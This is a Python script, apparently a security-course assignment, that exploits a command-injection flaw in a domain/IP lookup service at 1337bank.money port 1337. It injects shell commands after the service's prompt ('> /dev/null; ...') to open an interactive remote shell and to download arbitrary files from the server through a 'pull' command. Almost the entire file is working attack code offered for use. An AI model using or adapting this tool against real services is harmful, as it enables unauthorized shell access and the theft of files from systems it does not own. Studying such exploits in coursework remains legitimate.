"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import os
import sys
import shlex
import socket
import select
import tempfile
from threading import Event, Thread

host = "1337bank.money" # IP address here
port = 1337 # Port here

def print_usage():
    usage = ("\n"
             "\n"
             "Possible commands:\n"
             "\n"
             "1) shell                               Drop into an interactive shell and allow users to gracefully exit\n"
             "2) pull <remote-path> <local-path>     Download files\n"
             "3) help                                Shows this help menu\n"
             "4) quit                                Quit the shell\n"
             "\n")
    print(usage)

def do_shell():
    print('')

    # Connect to socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Verify connection
    msg = s.recv(35)
    if msg != b'Give me a domain or IP to look up:\n':
        print('Unexpected server response: ' + msg.decode('utf_8'), file=sys.stderr)

    # Begin shell on server
    shell_cmd = b'> /dev/null; PS1=\'$PWD> \' script -fq /dev/null'
    s.send(shell_cmd)
    s.send(b'\n')

    # Read command lines from user
    running = True
    while running:
        socks, _, _ = select.select([sys.stdin, s], [], [])

        if s in socks:
            response = s.recv(65536)
            if response:
                print(response.decode('utf_8'), end='', flush=True)
            else:
                running = False
        if sys.stdin in socks:
            line = sys.stdin.readline()
            s.send(line.encode('utf_8'))

    print('')
    return

def do_pull(remote_path, local_path):
    # Connect to socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # Verify connection
    msg = s.recv(35)
    if msg != b'Give me a domain or IP to look up:\n':
        print('Unexpected server response: ' + msg.decode('utf_8'), file=sys.stderr)

    # Cat file
    path_bytes = remote_path.encode('utf_8')
    shell_cmd = (b'> /dev/null; '
                 b'if [ -f "%s" ]; then '
                 b'if [ -r "%s" ]; then '
                 b'echo 0; cat "%s"; '
                 b'else echo 2; fi '
                 b'else echo 1; fi ') % (path_bytes,
                                         path_bytes,
                                         path_bytes)
    s.send(shell_cmd)
    s.send(b'\n')

    # Check if file exists and can be read
    exists = s.recv(2)
    if exists == b'0\n':
        pass
    elif exists == b'1\n':
        print('The file \'' + remote_path + '\' does not exist\n',
              file=sys.stdout)
        return
    elif exists == b'2\n':
        print('Remote system doesn\'t have read permissions\n',
              file=sys.stdout)
        return
    else:
        print('Unexpected response from system\n',
              file=sys.stdout)
        return


    # Retrieve data
    with tempfile.NamedTemporaryFile() as tmpfile:
        new_data = s.recv(65536)

        # Check that we haven't reached the end of the data
        while new_data:

            tmpfile.file.write(new_data)
            new_data = s.recv(65536)

        # Try to save temp file at given local path
        try:
            os.link(tmpfile.name, local_path)
        except FileExistsError:
            while True:
                print('The file \'' + local_path + '\' already exists. Do you want to overwrite? [yes/no]')
                line = sys.stdin.readline()
                response = line.strip()
                if response == 'yes':
                    print('')
                    os.unlink(local_path)
                    os.link(tmpfile.name, local_path)
                    return
                elif response == 'no':
                    print('\nPull aborted!')
                    return
                else:
                    print('\nPlease answer yes or no')

def execute_cmd(cmd):
    cmd_args = shlex.split(cmd)

    if cmd_args[0] == 'shell':
        # Check number of arguments
        if len(cmd_args) != 1:
            print_usage()
            return

        # Run shell
        do_shell()
        return

    elif cmd_args[0] == 'pull':
        # Check number of arguments
        if len(cmd_args) != 3:
            print_usage()
            return

        # Pull file
        do_pull(cmd_args[1], cmd_args[2])
        return

    elif cmd_args[0] == 'help':
        print_usage()
        return

    elif cmd_args[0] == 'quit':
        # Check number of arguments
        if len(cmd_args) != 1:
            print_usage()
            return

        # Exit
        sys.exit(0)

    else:
        print_usage()
        return

if __name__ == '__main__':
    print('> ', end='', flush=True)
    for line in sys.stdin:
        cmd = line.strip()
        execute_cmd(cmd)
        print('> ', end='', flush=True)
